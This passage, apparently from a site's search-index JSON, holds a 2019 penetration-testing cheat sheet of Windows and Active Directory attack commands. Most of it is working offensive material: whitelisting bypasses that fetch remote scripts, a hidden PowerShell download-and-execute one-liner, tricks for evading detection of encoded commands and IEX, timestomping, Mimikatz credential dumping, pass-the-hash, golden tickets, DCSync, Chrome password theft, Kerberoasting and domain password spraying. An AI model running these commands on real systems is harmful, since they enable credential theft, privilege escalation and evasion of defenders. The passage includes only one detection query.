/kb:976932\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#create-custom-dll-for-password-filters-and-install-on-dc-to-capture-changed-passwords","title":"Create custom DLL for password filters and install on DC to capture changed passwords","text":"<ul> <li>http://carnal0wnage.attackresearch.com/2013/09/stealing-passwords-every-time-they.html</li> </ul>"},{"location":"blogs/2019/penetration-testing-pasties/#application-whitelisting-bypass-techniques","title":"Application Whitelisting Bypass Techniques","text":"<p>SubTee Collection of Whitelist Bypass Techniques  https://bitbucket.org/jsthyer/wevade.git</p> <p>Version .0.0.3</p> <pre><code>1. IEExec -This technique may work in certain environments.  Its relies on the fact that many organizations trust executables signed\nby Microsoft.  We can misuse this trust by launching a specially crafted .NET application.\nExample Here: https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/\n\n2.  Rundll32.exe\n\n3.  ClickOnce Applications dfsvc.exe dfshim.dll\n\n4.  XBAP - XML Browser Applications WPF PresentationHost.exe\n\n5.  MD5 Hash Collision\nhttp://www.mathstat.dal.ca/~selinger/md5collision/\n\n6.  PowerShell - Specifically Reflective Execution\nhttp://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/\nhttps://www.defcon.org/images/defcon-21/dc-21-presentations/Bialek/DEFCON-21-Bialek-PowerPwning-Post-Exploiting-by-Overpowering-Powershell.pdf\n\n7. .HTA Application Invoke PowerShell Scripts\n    Launched by mshta.exe, bypasses IE security settings as well.\n\n8.  bat, vbs, ps1\n    1. cmd.exe /k &lt; script.txt\n    2. cscript.exe //E:vbscript script.txt\n    3. Get-Content script.txt | iex\n\n9. Malicious Troubleshooting packs - MSDT.exe\n    Reference: http://cybersyndicates.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble-shooting-packs-and-application-whitelist-bypass/\n    Thanks to @nberthaume, @Killswitch_GUI\n\n10. InstallUtil.exe\n    A signed MS binary that loads assemblies and executes - One of the best.\n    Examples here: https://gist.github.com/subTee\n\n11. Regsvcs/Regasm\n    See: https://gist.github.com/subTee/fb09ef511e592e6f7993\n    These 2 are Excellent.\n\n12. regsvr32.exe\n    https://gist.github.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302\n    This one is just simply amazing...\n    regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll\n\n13. Msbuild.exe\n    http://subt0x10.blogspot.com/2016/09/bypassing-application-whitelisting.html\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#certutil","title":"Certutil","text":"<p>https://gist.github.com/subTee/7937a8ef07409715f15b84781e180c46</p> <p>File download</p> <pre><code>    certutil -urlcache -split -f http://example.com/file\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#active-directory-enumeration","title":"Active Directory Enumeration","text":""},{"location":"blogs/2019/penetration-testing-pasties/#adfind","title":"Adfind","text":"<p>www.joeware.net/freetools/tools/adfind/</p> <pre><code>    AdFind.exe -u account@domain.com -up password -h 10.4.128.40:389 -b dc=domain,dc=com -f \"objectcategory=computer\" &gt; domain_computers.txt\n\n    AdFind.exe -u account@domain.com -up password -h 10.4.128.40:389 -b dc=domain,dc=com -f \"objectcategory=computer\" distinguishedName dNSHostName description whenchanged operatingSystem operatingSystemVersion &gt; domain_computers_light.txt\n\n    AdFind.exe -u account@domain.com -up pass -h 10.4.128.40:389 -b dc=domain,dc=com -f \"objectcategory=user\" samaccountname description pwdlastset orclcommonattribute &gt; domain_users_light.txt\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#powershell","title":"Powershell","text":"<p>List help for cmdlet: <code>Get-Help [cmdlet] -full</code></p> <p>List available properties and methods: <code>Get-Member</code></p> <p>For-each loop: <code>ForEach-Object { $_ }</code></p> <p>Search for string (like grep): <code>Select-String -path [file] -pattern [string]</code></p> <p>Timestomp</p> <pre><code>    $file=(gi c:\\file.exe);\n    $date='01/03/2009 12:12 pm';\n    $file.LastWriteTime=$date;\n    $file.LastAccessTime=$date;\n    $file.CreationTime=$date\n</code></pre> <p>Show last system boot time</p> <pre><code>    Get-WmiObject win32_operatingsystem | select csname, @{LABEL='LastBootUpTime'; EXPRESSION={$_.ConverttoDateTime($_.lastbootuptime)}}\n</code></pre> <p>Wrap binary execution in a powershell loop</p> <pre><code>    powershell foreach ($target in (get-content c:\\users\\username\\appdata\\local\\temp\\hosts_da_loggedin_unique.txt)) { \"[*] $Target:\"; (c:\\programdata\\sd.exe ./administrator@$target -hashes aad3b435b51404eeaad3b435b51404ee:a4bab1c7d4bef62d4c22043ddbf1312c) }`\n</code></pre> <p>Download a file</p> <pre><code>    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};(new-object system.net.webclient).downloadfile(\"https://www.mydomain.com/file\",\"C:\\Users\\username\\AppData\\Local\\Temp\\file.txt\")\n</code></pre> <p>Encode string</p> <pre><code>    echo \"iex (New-Object Net.WebClient).DownloadString('http://192.168.1.1:80/file')\" | iconv --to-code UTF-16LE | base64 -w 0\n</code></pre> <p>List recently modified files in path (U:)</p> <pre><code>    Get-Childitem u:\\ -Recurse | where-object {!($_.psiscontainer)} | where { $_.LastWriteTime -gt $(Get-Date).AddDays(-1)  } | foreach {\"$($_.LastWriteTime) :: $($_.Fullname) \"  }\n</code></pre> <p>List Files</p> <pre><code>    Select-String -Path c:\\fso\\*.txt, c:\\fso\\*.log -pattern ed\n</code></pre> <p>List First 100 Files</p> <pre><code>    Get-ChildItem -Path XXX |Select -First 100 Fullname\n</code></pre> <p>List a Process's Loaded Modules (DLL)</p> <pre><code>    get-process -id 1234|select -expand modules\n</code></pre> <p>Remote Command Execution using MMC</p> <pre><code>    https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/\n</code></pre> <p>Get LocalAccountTokenFilterPolicy (Determine if you can authenticate to admin resources over the network, i.e. C,ADMIN)</p> <pre><code>    Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ |Select LocalAccountTokenFilterPolicy |fl\n</code></pre> <p>Test User Credentials</p> <pre><code>    powerpick $password = ConvertTo-SecureString \"PlainTextPassword\" -AsPlainText -Force;$cred= New-Object System.Management.Automation.PSCredential (\"domain\\name\", $password);\n</code></pre> <p>Search for SSN</p> <p>https://technet.microsoft.com/en-us/library/2008.04.securitywatch.aspx</p> <pre><code>    $SSN_Regex = \" [0-9]{3}[-| ][0-9]{2}[-| ][0-9]{4}\" ; Get-ChildItem . -Recurse -exclude *.exe,*.dll| Select-String -Pattern $SSN_Regex | Select-String -Pattern $SSN_Regex| Select-Object Path,Filename,Matches |ft -auto|out-string -width 200; \"[*] SSN Search Complete!\"\n</code></pre> <p>Enumerate the use of the Windows Server Update Services (WSUS)</p> <pre><code>    Get-ItemProperty -Path Registry::\"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\" |Select-Object -ExpandProperty WUServer\n\n    Get-ItemProperty -Path Registry::\"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\" |Select-Object -ExpandProperty WUStatusServer\n\n    Get-ItemProperty -Path Registry::\"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" |Select-Object -ExpandProperty UseWUServer\n\n    reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\n</code></pre> <p>Get unquoted service paths</p> <pre><code>    gwmi win32_service |Select pathname | Where {($_.pathname -ne $null)} | Where {-not $_.pathname.StartsWith(\"`\"\")} | Where {($_.pathname.Substring(0, $_.pathname.IndexOf(\".\") +4)) -match \".* .*\"}\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#find-files-custom","title":"Find-Files (custom)","text":"<pre><code>    Find-Files -searchBase \"i:\\\" -searchTerms \"*web.xml*,*web.config*,*password*,*tomcat-users.xml*\" -LogPath \"C:\\Users\\username\\AppData\\Local\\Temp\"\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#get-enumeration-custom","title":"Get-Enumeration (custom)","text":"<p>Run Local and Domain enumeration functions on the local host.</p> <pre><code>    Get-Enumeration -Path . -Local -Domain\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#download-and-execute-iex","title":"Download and execute IEX","text":"<pre><code>    powershell -nop -w hidden -c \"iex (New-Object Net.WebClient).DownloadString('http://192.168.1.1:80/file')\"\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#encodedcommand-and-iex-detection-bypass","title":"EncodedCommand and IEX detection bypass","text":"<p>Author: Dave Kennedy Source: https://www.trustedsec.com/blog/circumventing-encodedcommand-detection-powershell/</p> <p>Avoid detection of -enc</p> <pre><code>    powershell -window hidden -C \"set-variable -name \"C\" -value \"-\"; set-variable -name \"s\" -value \"e\"; set-variable -name \"q\" -value \"c\"; set-variable -name \"P\" -value ((get-variable C).value.toString()+(get-variable s).value.toString()+(get-variable q).value.toString()) ; powershell (get-variable P).value.toString() &lt;b64encodedcommandhere&gt;\"\n</code></pre> <p>Avoid detection of IEX</p> <pre><code>    powershell -window hidden -C \"set-variable -name \"LB\" -value \"I\"; set-variable -name \"I\" -value \"E\"; set-variable -name \"V\" -value \"X\"; set-variable -name \"wP\" -value ((get-variable LB).value.toString()+(get-variable I).value.toString()+(get-variable V).value.toString()) ; powershell (get-variable wP).value.toString() ('&lt;YOURINVOKEEXPRESSIONSTUFFHERE&gt;')\"\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#bloodhound","title":"Bloodhound","text":"<pre><code>    iex((new-object system.net.webclient).downloadstring('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/PowerShell/BloodHound.ps1'));Invoke-Bloodhound -CSVFolder c:\\temp -CSVPrefix &lt;prefix&gt;\n\n    Invoke-BloodHound -DomainController &lt;domain IP&gt; -Domain &lt;FQDN&gt; -CSVFolder C:\\users\\public\\libraries -CSVPrefix &lt;prefix&gt; -CollectionMethod Stealth\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#mimikittenz","title":"Mimikittenz","text":"<p>https://github.com/putterpanda/mimikittenz</p> <p>mimikittenz is a post-exploitation powershell tool that utilizes the Windows function ReadProcessMemory() in order to extract plain-text passwords from various target processes.</p> <p>mimikittenz can also easily extract other kinds of juicy info from target processes using regex patterns including but not limited to:</p> <ul> <li>TRACK2 (CreditCard) data from merchant/POS processes</li> <li>PII data</li> <li>Encryption Keys &amp; All the other goodstuff</li> </ul> <p>Execution</p> <pre><code>    Invoke-Mimikittenz\n</code></pre> <p>Customizations</p> <pre><code>    Custom regex - The syntax for adding custom regex is as follows:\n    [mimikittenz.MemProcInspector]::AddRegex(\"&lt;NameOfTarget&gt;\",\"&lt;regex_here&gt;\")\n\n    Custom target process - Just append your target proccess name into the array:\n    [mimikittenz.MemProcInspector]::InspectManyProcs(\"iexplore\",\"chrome\",\"firefox\")\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#powerup","title":"PowerUp","text":"<p>Performs multiple local host privilege escalation checks for common Windows misconfigurations.</p> <pre><code>    Invoke-AllChecks\n</code></pre> <p>See cheat sheet for more commands</p>"},{"location":"blogs/2019/penetration-testing-pasties/#powerview","title":"PowerView","text":"<ul> <li>Requires domain user privileges</li> </ul> <p>Find Administrative users logged in across the domain - default group = Domain Admins)</p> <pre><code>    Invoke-UserHunter -Threads 15 -NoPing [-GroupName \u201cEnterprise Admins\u201d]\n    Invoke-UserHunter -Threads 20 -GroupName \"Domain Admins\" -SearchForest -CheckAccess\n</code></pre> <p>Find User (Stealthy via Fileshares)</p> <pre><code>    Invoke-UserHunter -Stealth -Threads 5 -NoPing [-GroupName \u201cEnterprise Admins\u201d] [-UserName \"svcAccount\"]\n</code></pre> <p>Get domain user info</p> <pre><code>    Get-NetUser [-UserName john]\n\n    Get-NetUser -Domain &lt;domain&gt; | Select-Object objectsid,lockouttime,samaccounttype,accountexpires,objectclass,useraccountcontrol,@{Name='memberof';Expression={[string]::join(\";\",($_.memberof))}},info,distinguishedname,adspath,cn,pwdlastset,objectguid,whencreated,description,samaccountname,usnchanged,name|  export-csv userprops_members.csv\n</code></pre> <p>Find group names</p> <pre><code>    Get-NetGroup [-GroupName *admin*]\n</code></pre> <p>Get group members</p> <pre><code>    Get-NetGroupMember [-GroupName \u201cDomain Admins\u201d]\n</code></pre> <p>Find open shares - Noisy</p> <pre><code>    Invoke-ShareFinder -CheckShareAccess\n</code></pre> <p>Find open (non-default i.e. C$) shares by LDAP source</p> <pre><code>    Invoke-ShareFinder -ComputerADSPath \"LDAP://OU=Servers,OU=IT,DC=domain,DC=com\" -CheckShareAccess -ExcludeStandard | Out-File -Encoding ascii c:\\windows\\temp\\server_shares.txt\n\n    Invoke-ShareFinder -ExcludePrint -ExcludeIPC -CheckShareAccess\n</code></pre> <p>Find interesting files</p> <pre><code>    powershell Invoke-FileFinder -ComputerName &lt;hostname&gt; -share share_list.txt -terms ssn,pass,sensitive,secret,admin,login,unattend*.xml,web.config,account -Threads 20 | export-csv filefinder_shares.csv\n</code></pre> <p>Find hosts where the current user is local admin - Noisy</p> <pre><code>    Find-LocalAdminAccess\n</code></pre> <p>Get details of all domain computers and export to a CSV file for easy viewing</p> <pre><code>    Get-computerproperty -Domain &lt;domain.com&gt; -properties displayname,adspath,lastlogontimestamp,operatingsystem,operatingsystemversion,@{Name='memberof';Expression={[string]::join(\";\",($_.memberof))}}|export-csv computerprops.csv\n</code></pre> <p>Get Computers with Unconstrained Delegation</p> <pre><code>    Get-NetComputer -Unconstrained |ft -a\n</code></pre> <p>Get Users &amp; Computers Trusted for Delegation</p> <pre><code>    Get-DomainUser -TrustedtoAuth -Properties distinguisedname,useraccountcontrol,msds-allowedtodelegateto|fl\n\n    Get-DomainComputer -TrustedtoAuth -Properties distinguisedname,useraccountcontrol,msds-allowedtodelegateto|fl\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#net-functions","title":"net * Functions:","text":"<pre><code>    Get-NetDomain                   -   gets the name of the current user's domain\n    Get-NetForest                   -   gets the forest associated with the current user's domain\n    Get-NetForestDomain             -   gets all domains for the current forest\n    Get-NetDomainController         -   gets the domain controllers for the current computer's domain\n    Get-NetUser                     -   returns all user objects, or the user specified (wildcard specifiable)\n    Add-NetUser                     -   adds a local or domain user\n    Get-NetComputer                 -   gets a list of all current servers in the domain\n    Get-NetPrinter                  -   gets an array of all current computers objects in a domain\n    Get-NetOU                       -   gets data for domain organization units\n    Get-NetSite                     -   gets current sites in a domain\n    Get-NetSubnet                   -   gets registered subnets for a domain\n    Get-NetGroup                    -   gets a list of all current groups in a domain\n    Get-NetGroupMember              -   gets a list of all current users in a specified domain group\n    Get-NetLocalGroup               -   gets the members of a localgroup on a remote host or hosts\n    Add-NetGroupUser                -   adds a local or domain user to a local or domain group\n    Get-NetFileServer               -   get a list of file servers used by current domain users\n    Get-DFSshare                    -   gets a list of all distribute file system shares on a domain\n    Get-NetShare                    -   gets share information for a specified server\n    Get-NetLoggedon                 -   gets users actively logged onto a specified server\n    Get-NetSession                  -   gets active sessions on a specified server\n    Get-NetRDPSession               -   gets active RDP sessions for a specified server (like qwinsta)\n    Get-NetProcess                  -   gets the remote processes and owners on a remote server\n    Get-UserEvent                   -   returns logon or TGT events from the event log for a specified host\n    Get-ADObject                    -   takes a domain SID and returns the user, group, or computer\n                                        object associated with it\n    Set-ADObject                    -   takes a SID, name, or SamAccountName to query for a specified\n                                        domain object, and then sets a specified 'PropertyName' to a\n                                        specified 'PropertyValue'\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#gpo-functions","title":"GPO functions","text":"<pre><code>    Get-GptTmpl                     -   parses a GptTmpl.inf to a custom object\n    Get-NetGPO                      -   gets all current GPOs for a given domain\n    Get-NetGPOGroup                 -   gets all GPOs in a domain that set \"Restricted Groups\"\n                                        on on target machines\n    Find-GPOLocation                -   takes a user/group and makes machines they have effective\n                                        rights over through GPO enumeration and correlation\n    Find-GPOComputerAdmin           -   takes a computer and determines who has admin rights over it\n                                        through GPO enumeration\n    Get-DomainPolicy                -   returns the default domain or DC policy\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#user-hunting-functions","title":"User-Hunting Functions:","text":"<pre><code>    Invoke-UserHunter               -   finds machines on the local domain where specified users are logged into, and can optionally check if the current user has local admin access to found machines\n    Invoke-StealthUserHunter        -   finds all file servers utilizes in user HomeDirectories, and checks the sessions one each file server, hunting for particular users\n    Invoke-ProcessHunter            -   hunts for processes with a specific name or owned by a specific user on domain machines\n    Invoke-UserEventHunter          -   hunts for user logon events in domain controller event logs\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#domain-trust-functions","title":"Domain Trust Functions:","text":"<pre><code>    Get-NetDomainTrust              -   gets all trusts for the current user's domain\n    Get-NetForestTrust              -   gets all trusts for the forest associated with the current user's domain\n    Find-ForeignUser                -   enumerates users who are in groups outside of their principal domain\n    Find-ForeignGroup               -   enumerates all the members of a domain's groups and finds users that are outside of the queried domain\n    Invoke-MapDomainTrust           -   try to build a relational mapping of all domain trusts\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#metafunctions","title":"MetaFunctions:","text":"<pre><code>    Invoke-ShareFinder              -   finds (non-standard) shares on hosts in the local domain\n    Invoke-FileFinder               -   finds potentially sensitive files on hosts in the local domain\n    Find-LocalAdminAccess           -   finds machines on the domain that the current user has local admin access to\n    Find-UserField                  -   searches a user field for a particular term\n    Find-ComputerField              -   searches a computer field for a particular term\n    Get-ExploitableSystem           -   finds systems likely vulnerable to common exploits\n    Invoke-EnumerateLocalAdmin      -   enumerates members of the local Administrators groups across all machines in the domain\n</code></pre> <p>HarmJ0y PowerView Cheat Sheet PDF HarmJ0y's PowerView 2.0 Tricks Gist</p>"},{"location":"blogs/2019/penetration-testing-pasties/#inveigh","title":"Inveigh","text":"<p>https://github.com/Kevin-Robertson/Inveigh</p> <p>Inveigh is a Windows PowerShell LLMNR/NBNS spoofer/man-in-the-middle tool designed to assist penetration testers that find themselves limited to a Windows system.</p> <ul> <li>The main Inveigh LLMNR/NBNS spoofer function.</li> </ul>"},{"location":"blogs/2019/penetration-testing-pasties/#privilege-requirements","title":"Privilege Requirements:","text":"<ul> <li>Elevated Administrator or SYSTEM</li> </ul>"},{"location":"blogs/2019/penetration-testing-pasties/#features","title":"Features:","text":"<ul> <li>IPv4 LLMNR/NBNS spoofer with granular control</li> <li>NTLMv1/NTLMv2 challenge/response capture over HTTP/HTTPS/SMB</li> <li>Basic auth cleartext credential capture over HTTP/HTTPS</li> <li>WPAD server capable of hosting a basic or custom wpad.dat file</li> <li>HTTP/HTTPS server capable of hosting limited content</li> <li>Granular control of console and file output</li> <li>Run time control</li> </ul>"},{"location":"blogs/2019/penetration-testing-pasties/#powershell-wout-powershell","title":"Powershell W/out Powershell","text":"<ul> <li>MsBuild.exe   https://gist.githubusercontent.com/subTee/6b236083da2fd6ddff216e434f257614/raw/a224d1edd3453cc321c63aaeefd2b59ea00622a2/pshell.xml</li> </ul>"},{"location":"blogs/2019/penetration-testing-pasties/#get-indexeditem","title":"Get-IndexedItem","text":"<p>Gets files which have been indexed by Windows desktop search. Searches the Windows index on the local computer or a remote file serving computer looking for file properties or free text searching over contents</p> <p>Sources: https://gallery.technet.microsoft.com/scriptcenter/Get-IndexedItem-PowerShell-5bca2dae https://github.com/adaptivethreat/Empire/blob/master/data/module_source/collection/Get-IndexedItem.ps1</p>"},{"location":"blogs/2019/penetration-testing-pasties/#interacting-w-windows-api","title":"Interacting w/ Windows API","text":"<p>https://blogs.technet.microsoft.com/heyscriptingguy/2013/06/25/use-powershell-to-interact-with-the-windows-api-part-1/</p>"},{"location":"blogs/2019/penetration-testing-pasties/#example-lock-workstation-and-messagebox","title":"Example - Lock Workstation and MessageBox","text":"<pre><code>    Add-Type -TypeDefinition @\"\n    using System;\n    using System.Diagnostics;\n    using System.Runtime.InteropServices;\n\n    public static class User32\n    {\n        [DllImport(\"user32.dll\", CharSet=CharSet.Auto)]\n            public static extern bool MessageBox(\n                IntPtr hWnd,     /// Parent window handle\n                String text,     /// Text message to display\n                String caption,  /// Window caption\n                int options);    /// MessageBox type\n        [DllImport(\"user32.dll\", CharSet=CharSet.Auto)]\n        public static extern bool LockWorkStation();\n\n    }\n    \"@\n\n    [USER32]::LockWorkStation()\n</code></pre> <p>List static methods</p> <pre><code>    [USER32] |get-member -static\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#mailsniper-owa-and-exchange-enumeration","title":"MailSniper (OWA and Exchange Enumeration)","text":"<p>Source: https://github.com/dafthack/MailSniper</p> <p>MailSniper is a penetration testing tool for searching through email in a Microsoft Exchange environment for specific terms (passwords, insider intel, network architecture information, etc.). It can be used as a non-administrative user to search their own email, or by an Exchange administrator to search the mailboxes of every user in a domain.</p> <p>MailSniper also includes additional modules for password spraying, and gathering the Global Address List from OWA and EWS.</p> <p>Bypassing Dual Factor Authentication on OWA - http://www.blackhillsinfosec.com/?p=5396</p> <ul> <li>It appears that Outlook portals that are being protected by two-factor authentication might not be covering all of the authentication protocols to Microsoft Exchange.</li> <li>Leverages the Exchange Web Services (EWS) feature of OWA. Just have to check for the presence of mail.org.com\\EWS\\Exchange.asmx</li> </ul> <p>```Invoke-SelfSearch -Mailbox email@domain.com -ExchHostname mail.domain.com -Remote</p> <p>```</p> <ul> <li>After the credentials have been entered MailSniper will attempt to connect to the EWS URL at https://mail.domain.com/EWS/Exchange.asmx and search the user\u2019s inbox for key terms (by default \u201cpass\u201d, \u201ccreds\u201d, and \u201ccredentials\u201d).</li> </ul>"},{"location":"blogs/2019/penetration-testing-pasties/#locate-owa-instances-via-autodiscover-using-only-organization-primary-domain-name","title":"Locate OWA instances via Autodiscover using only organization primary domain name","text":"<pre><code>    &lt;smtp-mail-domain&gt;/Autodiscover/Autodiscover.xml\n\n    or\n\n    autodiscover.&lt;smtp-mail-domain&gt;/Autodiscover/Autodiscover.xml\n\n    or\n\n    dig _autodiscover._tcp.&lt;domain-name&gt; SRV\n    ; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; _autodiscover._tcp.&lt;domain-name&gt;.org SRV\n    ;; global options: +cmd\n    ;; Got answer:\n    ;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 45003\n    ;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0\n\n    ;; QUESTION SECTION:\n    ;_autodiscover._tcp.&lt;domain-name&gt;.org.  IN  SRV\n\n    ;; ANSWER SECTION:\n    _autodiscover._tcp.&lt;domain-name&gt;.org. 1720 IN   SRV 0 0 443 webmail.&lt;domain-name&gt;.org.\n\n    ;; Query time: 2 msec\n    ;; SERVER: 192.168.178.1#53(192.168.178.1)\n    ;; WHEN: Thu Dec  1 10:40:33 2016\n    ;; MSG SIZE  rcvd: 83\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#domainpasswordspray-internal-windows-domain-password-brute-forcing","title":"DomainPasswordSpray (Internal Windows Domain Password Brute Forcing)","text":"<p>Source: https://github.com/dafthack/DomainPasswordSpray</p> <p>DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain. By default it will automatically generate the userlist from the domain. BE VERY CAREFUL NOT TO LOCKOUT ACCOUNTS!</p>"},{"location":"blogs/2019/penetration-testing-pasties/#quick-start-guide","title":"Quick Start Guide","text":"<p>Open a PowerShell terminal from the Windows command line with 'powershell.exe -exec bypass'.</p> <pre><code>    Type 'Import-Module Invoke-DomainPasswordSpray.ps1'.\n</code></pre> <p>The only option necessary to perform a password spray is either -Password for a single password or -PasswordList to attempt multiple sprays. When using the -PasswordList option Invoke-DomainPasswordSpray will attempt to gather the account lockout observation window from the domain and limit sprays to one per observation window to avoid locking out accounts.</p> <p>The following command will automatically generate a list of users from the current user's domain and attempt to authenticate using each username and a password of Winter2016.</p> <pre><code>    PowerShell Invoke-DomainPasswordSpray -Password Winter2016\n</code></pre> <p>The following command will use the userlist at users.txt and try to authenticate to the domain \"domain-name\" using each password in the passlist.txt file one at a time. It will automatically attempt to detect the domain's lockout observation window and restrict sprays to one attempt during each window. The results of the spray will be output to a file called sprayed-creds.txt</p> <pre><code>    PowerShell Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#invoke-domainpasswordspray-options","title":"Invoke-DomainPasswordSpray Options","text":"<pre><code>    UserList          - Optional UserList parameter. This will be generated automatically if not specified.\n    Password          - A single password that will be used to perform the password spray.\n    PasswordList      - A list of passwords one per line to use for the password spray (Be very careful not to lockout accounts).\n    OutFile           - A file to output the results to.\n    Domain            - A domain to spray against.\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#misc-powershell-pasties","title":"Misc Powershell Pasties","text":"<p>List Removeable Drives</p> <pre><code>    Get-WmiObject Win32_LogicalDisk | Where-Object {($_.DriveType -eq 2) -and ($_.DeviceID -ne 'A:')} | %{\"USB_PROCESS_DETECTED: \" + $_.ProviderName  + \"`n\"}\n</code></pre> <p>Random Execution Method</p> <pre><code>$visio = [activator]::CreateInstance([type]::GetTypeFromProgID(\"visio.application\", \"system1\"))\n$docs = $visio.Documents.Add(\"\")\n$docs.ExecuteLine('CreateObject(\"Wscript.Shell\").Exec(\"cmd.exe\")')\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#mimikatz","title":"Mimikatz","text":"<p>https://github.com/gentilkiwi/mimikatz/wiki https://adsecurity.org/?p=2362</p> <p>Dump Cleartext Credentials</p> <pre><code>    sekurlsa::wdigest\n    sekurlsa::logonpasswords\n    lsadump::secrets\n</code></pre> <p>Dump cached domain credentials</p> <pre><code>    lsadump::cache\n</code></pre> <p>Format mscachev2 as <code>$DCC2$10240#username#hash</code></p> <pre><code>    cat 'mscachecreds.txt' | awk -F \u201c:\u201d {'print \"$DCC2$10240#\"$1\"#\"$2'}\n</code></pre> <p>Crack mscachev2 format with Hashcat (extremely slow)</p> <pre><code>    ./hashcat -m 2100 -a 0 mscachev2.dump ./wordlists/* -r rules/dive.rule\n</code></pre> <p>DCSYNC - Remote Hash Dumping from a Domain Controller</p> <pre><code>    mimikatz lsadump::dcsync /user:domain\\krbtgt\n</code></pre> <ul> <li>There is also a CS built-in function for this</li> <li>Source: http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/</li> </ul> <p>Pass the Hash</p> <pre><code>    mimikatz sekurlsa::pth /user:localadmin /domain:. /ntlm:21306681c738c3ed2d615e29be1574a3 /run:powershell -w hidden\n</code></pre> <p>Golden Ticket Creation (File)</p> <pre><code>    mimikatz kerberos::golden /user:newadmin /domain:domain.com /sid:S-1-5-21-3683589091-3492174527-1688384936 /groups:501,502,513,512,520,518,519 /krbtgt:&lt;krbtgthash&gt; /ticket:newadmin.tkt\n</code></pre> <p>Golden Ticket Creation (Pass-The-Ticket) - Create the ticket for your current session</p> <pre><code>    mimikatz kerberos::golden /user:newadmin /domain:domain.com /sid:S-1-5-21-3683589091-3492174527-1688384936 /krbtgt:&lt;krbtgthash&gt; /ptt\n</code></pre> <p>To create a Golden ticket to own the parent domain, once a child domain controller is compromised you will need the following pieces:</p> <pre><code>    /user:ChildDomainControllerMachineName$\u2002\u2002\n    /rc4: KRBTGT Hash\n    /sid:Child Domain SID\n    /domain:FQDN of Child Domain\n    /groups:516\n    /sids:ParentSID-516,S-1-5-9\n    /id:ID of Child Domain Controller\n    /ptt\n</code></pre> <p>Dump Google Chrome passwords</p> <pre><code>    shell copy \"C:\\users\\kobrien\\appdata\\local\\google\\chrome\\user data\\default\\Login Data\" C:\\users\\public\\libraries\\ld.dat\n\n    steal_token &lt;user pid&gt;\n\n    mimikatz @dpapi::chrome /in:C:\\users\\public\\libraries\\ld.dat /unprotect\n</code></pre> <p>Detecting Golden Ticket use on a DC</p> <pre><code>    &lt;QueryList&gt;\n    \u2002\u2002&lt;Query Id=\"0\" Path=\"Security\"&gt;\n    \u2002\u2002\u2002\u2002&lt;Select Path=\"Security\"&gt;\n    \u2002\u2002\u2002\u2002\u2002\u2002\u2002\u2002*[System[EventID='4768']]\n    \u2002\u2002\u2002\u2002\u2002\u2002\u2002\u2002and\n    \u2002\u2002\u2002\u2002\u2002\u2002\u2002\u2002*[EventData[Data[@Name='TargetUserName'] != 'ANONYMOUS LOGON']]\n    \u2002\u2002\u2002\u2002\u2002\u2002\u2002\u2002and\n    \u2002\u2002\u2002\u2002\u2002\u2002\u2002\u2002*[EventData[Data[@Name='ServiceName'] = 'krbtgt']]\n    \u2002\u2002\u2002\u2002\u2002\u2002\u2002\u2002and\n    \u2002\u2002\u2002\u2002\u2002\u2002\u2002\u2002*[EventData[Data[@Name='TicketEncryptionType'] = '0x17']]\n    \u2002\u2002\u2002\u2002\u2002\u2002\u2002\u2002&lt;/Select&gt;\n    \u2002\u2002&lt;/Query&gt;\n    &lt;/QueryList&gt;\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#kerberoast","title":"Kerberoast","text":"<p>https://github.com/nidem/kerberoast https://room362.com/post/2016/kerberoast-pt1/ https://room362.com/post/2016/kerberoast-pt2/ https://room362.com/post/2016/kerberoast-pt3/</p> <pre><code>    Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"MSSQLSvc/host.domain.com\"\n</code></pre> <p>Use mimikatz to export SPN Tikets once requested (Generates one file per ticket unless base64 option is used)</p> <pre><code>    mimkatz kerberos::list /export\n    Invoke-Mimikatz -Command 'standard::base64 \"kerberos::list /export\" 